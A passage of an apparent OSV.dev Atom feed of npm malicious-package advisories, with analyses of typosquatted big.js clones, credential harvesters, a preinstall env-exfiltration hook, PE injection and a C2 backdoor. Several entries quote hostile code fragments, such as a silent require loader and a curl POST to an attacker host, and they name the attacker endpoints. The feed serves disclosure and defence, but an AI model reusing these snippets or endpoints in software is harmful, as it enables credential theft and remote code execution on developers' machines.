+    <published>2026-06-23T06:22:06Z</published>
+    <updated>2026-06-23T17:01:26Z</updated>
+    <category term="npm"/>
+    <category term="GHSA-53h7-mc3v-w73c"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in ts-wross (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-53h7-mc3v-w73c&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;ts-wross&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (42dae43b7ff77748f10ae5faf6d87b7d63552e5629a37c931ea2c0de3539b469)
+Package is published under the name `ts-wross` but its package.json claims authorship by Michael Mclaughlin (M8ch88l@gmail.com) and points its repository field at https://github.com/MikeMcl/big.js.git, with description and keywords copied from the legitimate big.js arbitrary-precision arithmetic library. The shipped source is a verbatim copy of big.js v7.0.1 with one modification: a try/catch block injected mid-file in both `big.js` and `big.mjs` that runs `const doc = require(&amp;quot;node-slot&amp;quot;); doc.from_str().then(...).catch(...)` at module load. Errors are swallowed by the surrounding try/catch so the call is silent. `node-slot` is declar…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-53h7-mc3v-w73c"&gt;https://github.com/advisories/GHSA-53h7-mc3v-w73c&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/ts-wross/v/0.0.8"&gt;https://www.npmjs.com/package/ts-wross/v/0.0.8&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6278"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-6314: Malicious code in @zynkit/probe (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-6314</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6314"/>
+    <published>2026-06-23T16:22:48Z</published>
+    <updated>2026-06-23T17:01:26Z</updated>
+    <category term="npm"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in @zynkit/probe (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@zynkit/probe&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (5f7da2d08466718d66bb9a80478987eab5041e19ee53f80d6968e6dc3069edf2)
+No concrete indicators of installer-side harm were observed in this package version. No lifecycle scripts performing remote fetch-and-execute, no credential or environment scraping, no hardcoded attacker network destinations, and no silent-relay patterns are present.
+&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/@zynkit/probe/v/0.0.1"&gt;https://www.npmjs.com/package/@zynkit/probe/v/0.0.1&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6314"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-6321: Malicious code in ts-grok (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-6321</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6321"/>
+    <published>2026-06-23T16:11:24Z</published>
+    <updated>2026-06-23T17:01:26Z</updated>
+    <category term="npm"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in ts-grok (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;ts-grok&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (a981e7e3ba27d859a2c536cbc25c04ebece92e1992035226ea9246d8bd381f1d)
+Package ts-grok ships a verbatim copy of big.js v7.0.1 (same banner, author &amp;#x27;Michael Mclaughlin&amp;#x27;, repository URL https://github.com/MikeMcl/big.js.git, and identical keywords) with a single foreign code block injected into both big.js and big.mjs: `try { const doc = require(&amp;quot;node-slot&amp;quot;); doc.from_str().then(e =&amp;gt; { }).catch(e =&amp;gt; { }) } catch (error) { }`. The require fires whenever a consumer imports the package, and all errors are swallowed so the call is invisible. The declared runtime dependency in package.json is &amp;#x27;block-slot&amp;#x27; (^1.0.9), not &amp;#x27;node-slot&amp;#x27; — the actual loaded module name does not match anything declared, so dependency-re…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/ts-grok/v/0.0.8"&gt;https://www.npmjs.com/package/ts-grok/v/0.0.8&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6321"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-6313: Malicious code in @zynkit/jwtbytes (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-6313</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6313"/>
+    <published>2026-06-23T16:22:25Z</published>
+    <updated>2026-06-23T17:01:25Z</updated>
+    <category term="npm"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in @zynkit/jwtbytes (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@zynkit/jwtbytes&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (56c346069fc4ee120281c9431c9f9544452f0d67b783df08750e00faaba5251b)
+The package&amp;#x27;s main entry `dist/mod.cjs` begins with `require(&amp;#x27;./prelude.cjs&amp;#x27;).runPrepare();`, so any `require(&amp;#x27;@zynkit/jwtbytes&amp;#x27;)` auto-runs a 280 KB obfuscator.io-style IIFE in `dist/prelude.cjs`. The IIFE uses an RC4+base64 string-array decoder, anti-debug traps (RegExp/setInterval, console neutralization, `--inspect`/`--inspect-brk` checks), and AES-256-GCM ciphertexts decrypted with XOR-derived keys to reconstruct an HTTPS URL at runtime. It then re-execs the current Node process with a sentinel environment variable, fetches a payload to `os.tmpdir()`, marks it executable, and spawns it via `process.execPath` or `/bin/sh -c`. The l…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/@zynkit/jwtbytes/v/0.5.1"&gt;https://www.npmjs.com/package/@zynkit/jwtbytes/v/0.5.1&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/@zynkit/jwtbytes/v/0.5.4"&gt;https://www.npmjs.com/package/@zynkit/jwtbytes/v/0.5.4&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/@zynkit/jwtbytes/v/0.5.2"&gt;https://www.npmjs.com/package/@zynkit/jwtbytes/v/0.5.2&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/@zynkit/jwtbytes/v/0.4.3"&gt;https://www.npmjs.com/package/@zynkit/jwtbytes/v/0.4.3&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/@zynkit/jwtbytes/v/0.5.3"&gt;https://www.npmjs.com/package/@zynkit/jwtbytes/v/0.5.3&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6313"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-6319: Malicious code in ts-escro (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-6319</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6319"/>
+    <published>2026-06-23T16:11:18Z</published>
+    <updated>2026-06-23T17:01:25Z</updated>
+    <category term="npm"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in ts-escro (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;ts-escro&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (26030cb7301c4ff9ea68753581f70290a957e1422b425df7119416fea126c324)
+The package ships a verbatim copy of MikeMcl/big.js v7.0.1 (same banner, MIT copyright, and API) but is published under a different name (ts-escro). At module load time, big.js line 606 (and big.mjs:606) executes `try { const doc = require(&amp;#x27;parket-slot&amp;#x27;); doc.from_str().then(e =&amp;gt; {}).catch(e =&amp;gt; {}) } catch (error) {}`, silently attempting to load and invoke an undeclared third-party module &amp;#x27;parket-slot&amp;#x27; with all errors swallowed. The package.json declares no dependency on &amp;#x27;parket-slot&amp;#x27;; the only declared dependency is a non-resolvable local filesystem path `log-taker: file:../log-taker`, which indicates the artifact was published from …&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/ts-escro/v/0.0.6"&gt;https://www.npmjs.com/package/ts-escro/v/0.0.6&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/ts-escro/v/0.0.8"&gt;https://www.npmjs.com/package/ts-escro/v/0.0.8&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6319"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-6318: Malicious code in ts-bn-lint-helper (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-6318</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6318"/>
+    <published>2026-06-23T16:11:21Z</published>
+    <updated>2026-06-23T17:01:25Z</updated>
+    <category term="npm"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in ts-bn-lint-helper (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;ts-bn-lint-helper&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (8847a06a4d25b751ec7d33732a23324a42d7b2775ce441811623500b7b60f267)
+Package masquerades as a TypeScript lint helper but ships a credential-harvesting payload in index.js. The exported from_str() recursively walks process.cwd() and uploads every file matching id.json, config.toml, Config.toml, config.json, env, and.env to https://data-stream.space/api/v1 via axios POST (index.js:178). It additionally harvests shell history from ~/.bash_history, ~/.zsh_history, fish history, ~/.sh_history, and PowerShell PSReadLine ConsoleHost_history.txt, falling back to spawning `bash -c history` and `zsh -c &amp;#x27;fc -l -1000&amp;#x27;` via execSync (index.js:101, 117, 128-152). The exfiltration URL and target file patterns are base…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/ts-bn-lint-helper/v/3.1.19"&gt;https://www.npmjs.com/package/ts-bn-lint-helper/v/3.1.19&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6318"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-6316: Malicious code in ts-biginteger-lib (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-6316</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6316"/>
+    <published>2026-06-23T16:07:35Z</published>
+    <updated>2026-06-23T17:01:25Z</updated>
+    <category term="npm"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in ts-biginteger-lib (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;ts-biginteger-lib&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (b8059a1d2db2edb7231b017023f82f6a651585c0ee7120aaebe882cb6407b9e3)
+Package is published as &amp;#x27;ts-biginteger-lib&amp;#x27; but its metadata, README, and source are a wholesale copy of big.js by MikeMcl (author set to &amp;#x27;Michael Mclaughlin &amp;lt;M8ch88l@gmail.com&amp;gt;&amp;#x27;, repository pointing at MikeMcl/big.js, README unchanged). Inserted into the otherwise-verbatim big.js source at big.js:605-609 is a try/catch that, at module load time, calls `require(&amp;quot;ts-lint-builders&amp;quot;)` and invokes `doc.from_str().then(...).catch(...)`. package.json additionally declares `&amp;quot;ts-linter-builders&amp;quot;: &amp;quot;latest&amp;quot;` as a runtime dependency. The legitimate big.js declares no runtime dependencies; these injected loads execute arbitrary code from separatel…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/ts-biginteger-lib/v/5.0.5"&gt;https://www.npmjs.com/package/ts-biginteger-lib/v/5.0.5&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6316"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[UPDATED] MAL-2026-6249: Malicious code in blinkit-core (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-6249</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6249"/>
+    <published>2026-06-21T16:21:08Z</published>
+    <updated>2026-06-23T17:01:25Z</updated>
+    <category term="npm"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in blinkit-core (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;blinkit-core&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (2ca70b0a6be36daf245deb50dd6b3595a9bfba29c62770e82365152a02832cf8)
+On `npm install`, the package&amp;#x27;s `preinstall` lifecycle hook runs `curl` against `http://d8s0b82plbq3u5sb2vo0sb3a9obr4yjt7.oast.site/` and POSTs the installer&amp;#x27;s hostname (`hostname -f`), current user (`whoami`), working directory, and a base64-encoded dump of the entire process environment (`env | base64 -w0`) — which on CI/build hosts routinely contains tokens, cloud credentials, and registry auth. The package itself is hollow: `index.js` only exports `{ name, version }` and provides no functionality. The `repository.url` claims `git+https://github.com/zomato/blinkit-core.git` while publishing under that internal-sounding name on the p…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/blinkit-core/v/1.0.0"&gt;https://www.npmjs.com/package/blinkit-core/v/1.0.0&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6249"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-6312: Malicious code in @tinyfox/shapecheck (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-6312</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6312"/>
+    <published>2026-06-23T16:22:49Z</published>
+    <updated>2026-06-23T17:01:24Z</updated>
+    <category term="npm"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in @tinyfox/shapecheck (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@tinyfox/shapecheck&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (ccad6ae47c18b5b41d16625a00ce1b493fc44d7e22658d549ff709d6df297b70)
+Package `@tinyfox/shapecheck` re-publishes the source of the legitimate `rulr` validation library (repository field still points at `git+https://github.com/ryasmi/rulr.git`) under a different name, and adds an obfuscated `dist/bootstrap.cjs` (~282 KB, obfuscator.io-style string-array + RC4-style decoder) that the library&amp;#x27;s main entry `dist/rulr.cjs` requires on every load. The exported `object()` API immediately calls `__tb.runPrepare()`, so simply `require(&amp;#x27;@tinyfox/shapecheck&amp;#x27;)` and using its documented validation API fires the malicious bootstrap. The bootstrap dynamically imports `https`, `child_process`, `crypto`, `fs`, `os`, `pat…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/@tinyfox/shapecheck/v/0.8.5"&gt;https://www.npmjs.com/package/@tinyfox/shapecheck/v/0.8.5&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/@tinyfox/shapecheck/v/0.8.6"&gt;https://www.npmjs.com/package/@tinyfox/shapecheck/v/0.8.6&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/@tinyfox/shapecheck/v/0.8.7"&gt;https://www.npmjs.com/package/@tinyfox/shapecheck/v/0.8.7&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/@tinyfox/shapecheck/v/0.8.8"&gt;https://www.npmjs.com/package/@tinyfox/shapecheck/v/0.8.8&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/@tinyfox/shapecheck/v/0.7.4"&gt;https://www.npmjs.com/package/@tinyfox/shapecheck/v/0.7.4&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6312"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-6299: Malicious code in analysis-chart (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-6299</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6299"/>
+    <published>2026-06-23T15:25:06Z</published>
+    <updated>2026-06-23T15:46:42Z</updated>
+    <category term="npm"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in analysis-chart (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;analysis-chart&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (a1ab4349bcc1e8f4434817d242b136f6e6050d4acb234aa833d81ffd74942066)
+The package&amp;#x27;s postinstall hook (install-hook.js, invoked via package.json scripts.postinstall) fetches an opaque binary &amp;#x27;payload.bin&amp;#x27; from https://github.com/Dimitrijenco/Sticky_note/releases/download/v6/payload.bin — a third-party GitHub release on an account unrelated to the package&amp;#x27;s claimed author. The downloaded bytes are XOR-decrypted with key 0x42, then loaded into the installer&amp;#x27;s process: kernel32.dll is loaded via koffi, RWX memory is allocated with VirtualAlloc, the decrypted PE is copied via RtlMoveMemory, VirtualProtect is applied, and CreateThread is started at the parsed PE entry point. This is in-memory shellcode/PE inje…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/analysis-chart/v/2.0.14"&gt;https://www.npmjs.com/package/analysis-chart/v/2.0.14&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/analysis-chart/v/2.0.16"&gt;https://www.npmjs.com/package/analysis-chart/v/2.0.16&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/analysis-chart/v/2.0.11"&gt;https://www.npmjs.com/package/analysis-chart/v/2.0.11&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/analysis-chart/v/2.0.13"&gt;https://www.npmjs.com/package/analysis-chart/v/2.0.13&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/analysis-chart/v/2.0.17"&gt;https://www.npmjs.com/package/analysis-chart/v/2.0.17&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/analysis-chart/v/2.0.18"&gt;https://www.npmjs.com/package/analysis-chart/v/2.0.18&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/analysis-chart/v/2.0.8"&gt;https://www.npmjs.com/package/analysis-chart/v/2.0.8&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/analysis-chart/v/2.0.10"&gt;https://www.npmjs.com/package/analysis-chart/v/2.0.10&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6299"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-6303: Malicious code in react-simple-utils-kit (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-6303</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6303"/>
+    <published>2026-06-23T14:46:34Z</published>
+    <updated>2026-06-23T15:46:42Z</updated>
+    <category term="npm"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in react-simple-utils-kit (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;react-simple-utils-kit&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (038aa6bccd8008fec1f309d718e53dd4b89e4ca15a976c6a80652e0dd58a5b58)
+Package advertises itself as &amp;#x27;a simple date formatting utility for React projects&amp;#x27; (3-function index.js), but ships a postinstall.js that runs on every `npm install` and performs an extensive reconnaissance + credential-harvest sweep against the installer&amp;#x27;s host, POSTing each result over plain HTTP to a hardcoded attacker endpoint at http://2e3bkumw.requestrepo.com (a one-shot request-interception domain unrelated to any legitimate publisher). postinstall.js:8 hardcodes `const BURL = &amp;#x27;http://2e3bkumw.requestrepo.com&amp;#x27;` and postinstall.js:16 invokes `execSync(\`curl -s -m 8 -X POST -d @${tmpFile} ${BURL}/${key}...\`)` to ship results. Co…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/react-simple-utils-kit/v/1.3.2"&gt;https://www.npmjs.com/package/react-simple-utils-kit/v/1.3.2&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/react-simple-utils-kit/v/1.2.2"&gt;https://www.npmjs.com/package/react-simple-utils-kit/v/1.2.2&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/react-simple-utils-kit/v/1.0.2"&gt;https://www.npmjs.com/package/react-simple-utils-kit/v/1.0.2&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/react-simple-utils-kit/v/1.4.2"&gt;https://www.npmjs.com/package/react-simple-utils-kit/v/1.4.2&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/react-simple-utils-kit/v/1.3.3"&gt;https://www.npmjs.com/package/react-simple-utils-kit/v/1.3.3&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/react-simple-utils-kit/v/1.3.1"&gt;https://www.npmjs.com/package/react-simple-utils-kit/v/1.3.1&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/react-simple-utils-kit/v/1.0.5"&gt;https://www.npmjs.com/package/react-simple-utils-kit/v/1.0.5&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/react-simple-utils-kit/v/1.0.1"&gt;https://www.npmjs.com/package/react-simple-utils-kit/v/1.0.1&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6303"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-6302: Malicious code in hashd-edu (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-6302</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6302"/>
+    <published>2026-06-23T15:24:26Z</published>
+    <updated>2026-06-23T15:46:42Z</updated>
+    <category term="npm"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in hashd-edu (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;hashd-edu&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (0f8480ae1ab46f8b6f61848c271af2819d88644df8d8f36b04b458103c5d5454)
+The package ships a full remote-shell backdoor that fires both at install time and at module load time. postinstall.js forks itself as a detached daemon (POSTINSTALL_DAEMON=1), generates/loads a machine UUID, and POSTs {uuid, hostname, platform} to http://98.86.244.177:8080/register. It then polls http://98.86.244.177:8080/beacon every 30 seconds and pipes any returned `command` field into child_process.exec(), POSTing stdout/stderr back to /results. index.js, declared as the package `main`, contains the identical C2 logic inside a top-level async IIFE, so any consumer that does `require(&amp;#x27;hashd-edu&amp;#x27;)` for the advertised greet() helpers…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/hashd-edu/v/1.0.5"&gt;https://www.npmjs.com/package/hashd-edu/v/1.0.5&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6302"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-6301: Malicious code in date-format-helper2 (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-6301</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6301"/>
+    <published>2026-06-23T15:21:06Z</published>
+    <updated>2026-06-23T15:46:42Z</updated>
+    <category term="npm"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in date-format-helper2 (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;date-format-helper2&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (66c1775ce65ad47476ee1a0f1c7c5373e61466ec3eb4543cc658e67d2de22960)
+Package is advertised as a React date-formatting utility, but its postinstall.js performs targeted credential harvesting on npm install. The script reads Coze workload identity environment variables (COZE_WORKLOAD_API_TOKEN, COZE_WORKLOAD_IDENTITY_CLIENT_ID, COZE_WORKLOAD_IDENTITY_CLIENT_SECRET, COZE_WORKLOAD_IDENTITY_TOKEN_ENDPOINT, COZE_PROJECT_SPACE_ID), uses them to mint OAuth access tokens via three grant types (client_credentials, token-exchange, and a JSON body variant) against the configured token endpoint, enumerates ~30 Coze API paths against api.coze.cn / integration.coze.cn / api.coze.com using the minted tokens, and POSTs …&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/date-format-helper2/v/1.0.3"&gt;https://www.npmjs.com/package/date-format-helper2/v/1.0.3&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/date-format-helper2/v/1.0.7"&gt;https://www.npmjs.com/package/date-format-helper2/v/1.0.7&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/date-format-helper2/v/1.0.6"&gt;https://www.npmjs.com/package/date-format-helper2/v/1.0.6&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/date-format-helper2/v/1.0.2"&gt;https://www.npmjs.com/package/date-format-helper2/v/1.0.2&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/date-format-helper2/v/1.0.4"&gt;https://www.npmjs.com/package/date-format-helper2/v/1.0.4&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/date-format-helper2/v/1.0.5"&gt;https://www.npmjs.com/package/date-format-helper2/v/1.0.5&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a 